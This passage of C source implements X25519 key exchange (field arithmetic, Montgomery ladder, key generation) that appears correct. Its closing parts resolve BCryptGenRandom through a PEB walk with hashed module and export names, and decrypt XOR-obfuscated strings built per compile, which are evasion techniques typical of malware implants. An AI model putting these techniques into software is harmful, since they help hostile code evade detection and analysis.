    h[4] = f[4] + 0xFFFFFFFFFFFFEULL - g[4];
}

/*
 * Multiplication mod 2^255-19 using 128-bit intermediates.
 * Uses GCC __uint128_t for the 64x64→128 products.
 */
typedef unsigned __int128 uint128_t;

void fe_mul(fe25519 h, const fe25519 f, const fe25519 g) {
    uint128_t t0, t1, t2, t3, t4;
    QWORD f0 = f[0], f1 = f[1], f2 = f[2], f3 = f[3], f4 = f[4];
    QWORD g0 = g[0], g1 = g[1], g2 = g[2], g3 = g[3], g4 = g[4];
    QWORD g1_19 = g1 * 19, g2_19 = g2 * 19, g3_19 = g3 * 19, g4_19 = g4 * 19;

    t0  = (uint128_t)f0*g0 + (uint128_t)f1*g4_19 + (uint128_t)f2*g3_19 + (uint128_t)f3*g2_19 + (uint128_t)f4*g1_19;
    t1  = (uint128_t)f0*g1 + (uint128_t)f1*g0    + (uint128_t)f2*g4_19 + (uint128_t)f3*g3_19 + (uint128_t)f4*g2_19;
    t2  = (uint128_t)f0*g2 + (uint128_t)f1*g1    + (uint128_t)f2*g0    + (uint128_t)f3*g4_19 + (uint128_t)f4*g3_19;
    t3  = (uint128_t)f0*g3 + (uint128_t)f1*g2    + (uint128_t)f2*g1    + (uint128_t)f3*g0    + (uint128_t)f4*g4_19;
    t4  = (uint128_t)f0*g4 + (uint128_t)f1*g3    + (uint128_t)f2*g2    + (uint128_t)f3*g1    + (uint128_t)f4*g0;

    QWORD c;
    c = (QWORD)(t0 >> 51); h[0] = (QWORD)t0 & 0x7FFFFFFFFFFFFULL; t1 += c;
    c = (QWORD)(t1 >> 51); h[1] = (QWORD)t1 & 0x7FFFFFFFFFFFFULL; t2 += c;
    c = (QWORD)(t2 >> 51); h[2] = (QWORD)t2 & 0x7FFFFFFFFFFFFULL; t3 += c;
    c = (QWORD)(t3 >> 51); h[3] = (QWORD)t3 & 0x7FFFFFFFFFFFFULL; t4 += c;
    c = (QWORD)(t4 >> 51); h[4] = (QWORD)t4 & 0x7FFFFFFFFFFFFULL;
    h[0] += c * 19;
    c = h[0] >> 51; h[0] &= 0x7FFFFFFFFFFFFULL; h[1] += c;
}

void fe_sq(fe25519 h, const fe25519 f) {
    fe_mul(h, f, f);
}

static void fe_mul_a24(fe25519 h, const fe25519 f) {
    /* a24 = (A-2)/4 = (486662-2)/4 = 121665 per RFC 7748 */
    uint128_t t0 = (uint128_t)f[0] * 121665;
    uint128_t t1 = (uint128_t)f[1] * 121665;
    uint128_t t2 = (uint128_t)f[2] * 121665;
    uint128_t t3 = (uint128_t)f[3] * 121665;
    uint128_t t4 = (uint128_t)f[4] * 121665;

    QWORD c;
    c = (QWORD)(t0 >> 51); h[0] = (QWORD)t0 & 0x7FFFFFFFFFFFFULL; t1 += c;
    c = (QWORD)(t1 >> 51); h[1] = (QWORD)t1 & 0x7FFFFFFFFFFFFULL; t2 += c;
    c = (QWORD)(t2 >> 51); h[2] = (QWORD)t2 & 0x7FFFFFFFFFFFFULL; t3 += c;
    c = (QWORD)(t3 >> 51); h[3] = (QWORD)t3 & 0x7FFFFFFFFFFFFULL; t4 += c;
    c = (QWORD)(t4 >> 51); h[4] = (QWORD)t4 & 0x7FFFFFFFFFFFFULL;
    h[0] += c * 19;
    c = h[0] >> 51; h[0] &= 0x7FFFFFFFFFFFFULL; h[1] += c;
}

/* Invert: f^(p-2) = f^(2^255-21) via addition chain */
void fe_invert(fe25519 out, const fe25519 z) {
    fe25519 t0, t1, t2, t3;
    int i;

    fe_sq(t0, z);         /* t0 = z^2 */
    fe_sq(t1, t0);
    fe_sq(t1, t1);        /* t1 = z^8 */
    fe_mul(t1, z, t1);    /* t1 = z^9 */
    fe_mul(t0, t0, t1);   /* t0 = z^11 */
    fe_sq(t2, t0);        /* t2 = z^22 */
    fe_mul(t1, t1, t2);   /* t1 = z^(2^5-1) = z^31 */
    fe_sq(t2, t1);
    for (i = 1; i < 5; i++) fe_sq(t2, t2);
    fe_mul(t1, t2, t1);   /* t1 = z^(2^10-1) */
    fe_sq(t2, t1);
    for (i = 1; i < 10; i++) fe_sq(t2, t2);
    fe_mul(t2, t2, t1);   /* t2 = z^(2^20-1) */
    fe_sq(t3, t2);
    for (i = 1; i < 20; i++) fe_sq(t3, t3);
    fe_mul(t2, t3, t2);   /* t2 = z^(2^40-1) */
    fe_sq(t2, t2);
    for (i = 1; i < 10; i++) fe_sq(t2, t2);
    fe_mul(t1, t2, t1);   /* t1 = z^(2^50-1) */
    fe_sq(t2, t1);
    for (i = 1; i < 50; i++) fe_sq(t2, t2);
    fe_mul(t2, t2, t1);   /* t2 = z^(2^100-1) */
    fe_sq(t3, t2);
    for (i = 1; i < 100; i++) fe_sq(t3, t3);
    fe_mul(t2, t3, t2);   /* t2 = z^(2^200-1) */
    fe_sq(t2, t2);
    for (i = 1; i < 50; i++) fe_sq(t2, t2);
    fe_mul(t1, t2, t1);   /* t1 = z^(2^250-1) */
    fe_sq(t1, t1);
    for (i = 1; i < 5; i++) fe_sq(t1, t1);
    fe_mul(out, t1, t0);  /* out = z^(2^255-21) */
}

/* Conditional swap (constant-time) */
static void fe_cswap(fe25519 f, fe25519 g, QWORD b) {
    QWORD mask = (QWORD)(-(long long)b);
    QWORD x;
    int i;
    for (i = 0; i < 5; i++) {
        x = mask & (f[i] ^ g[i]);
        f[i] ^= x;
        g[i] ^= x;
    }
}

void spec_x25519_scalarmult(BYTE shared_out[32],
                            const BYTE private_key[32],
                            const BYTE public_key[32]) {
    BYTE e[32];
    spec_memcpy(e, private_key, 32);
    /* Clamp scalar per RFC 7748 */
    e[0]  &= 248;
    e[31] &= 127;
    e[31] |= 64;

    fe25519 x1, x2, z2, x3, z3, tmp0, tmp1;
    fe_frombytes(x1, public_key);

    fe_1(x2);
    fe_0(z2);
    fe_copy(x3, x1);
    fe_1(z3);

    QWORD swap = 0;
    int pos;

    for (pos = 254; pos >= 0; pos--) {
        QWORD b = (e[pos / 8] >> (pos & 7)) & 1;
        swap ^= b;
        fe_cswap(x2, x3, swap);
        fe_cswap(z2, z3, swap);
        swap = b;

        fe25519 A, AA, B, BB, E, C, D, DA, CB;

        fe_add(A, x2, z2);
        fe_sq(AA, A);
        fe_sub(B, x2, z2);
        fe_sq(BB, B);
        fe_sub(E, AA, BB);
        fe_add(C, x3, z3);
        fe_sub(D, x3, z3);
        fe_mul(DA, D, A);
        fe_mul(CB, C, B);
        fe_add(tmp0, DA, CB);
        fe_sq(x3, tmp0);
        fe_sub(tmp1, DA, CB);
        fe_sq(tmp1, tmp1);
        fe_mul(z3, x1, tmp1);
        fe_mul(x2, AA, BB);
        fe_mul_a24(tmp0, E);
        fe_add(tmp0, AA, tmp0);
        fe_mul(z2, E, tmp0);
    }

    fe_cswap(x2, x3, swap);
    fe_cswap(z2, z3, swap);

    fe_invert(z2, z2);
    fe_mul(x2, x2, z2);
    fe_tobytes(shared_out, x2);

    spec_memset(e, 0, sizeof(e));
}

/* X25519 base point = 9 */
static const BYTE x25519_basepoint[32] = {9};

BOOL spec_x25519_generate_keypair(BYTE private_out[32],
                                  BYTE public_out[32]) {
    /* Resolve BCryptGenRandom from bcrypt.dll via PEB walk */
    typedef NTSTATUS (*fn_BCryptGenRandom)(PVOID, PBYTE, ULONG, ULONG);

    PVOID bcrypt_base = find_module_by_hash(HASH_BCRYPT_DLL);
    if (!bcrypt_base)
        return FALSE;

    fn_BCryptGenRandom pBCryptGenRandom =
        (fn_BCryptGenRandom)find_export_by_hash(bcrypt_base, HASH_BCRYPTGENRANDOM);
    if (!pBCryptGenRandom)
        return FALSE;

    /* BCRYPT_USE_SYSTEM_PREFERRED_RNG = 0x00000002 */
    NTSTATUS status = pBCryptGenRandom(NULL, private_out, 32, 0x00000002);
    if (!NT_SUCCESS(status))
        return FALSE;

    /* Clamp + generate public key = scalar * basepoint */
    spec_x25519_scalarmult(public_out, private_out, x25519_basepoint);
    return TRUE;
}

/* ================================================================== */
/*  Compile-time string decryption (XOR-based)                         */
/* ================================================================== */

/*
 * encrypt_strings.py generates arrays of XOR-encrypted bytes with a
 * per-build random 32-byte key. The key is the first 32 bytes of the
 * encrypted blob.
 * Layout: [key: 32 bytes][encrypted_byte_0, encrypted_byte_1, ...]
 * Decryption: plaintext[i] = encrypted[i + 32] ^ key[i % 32]
 */
#define STRING_KEY_SIZE 32

void spec_decrypt_string(const BYTE *encrypted, DWORD len, BYTE *output) {
    if (len <= STRING_KEY_SIZE) return;
    const BYTE *key = encrypted;
    const BYTE *enc = encrypted + STRING_KEY_SIZE;
    DWORD data_len = len - STRING_KEY_SIZE;
    DWORD i;
    for (i = 0; i < data_len; i++)
        output[i] = enc[i] ^ key[i % STRING_KEY_SIZE];
    output[data_len] = 0; /* null-terminate */
}
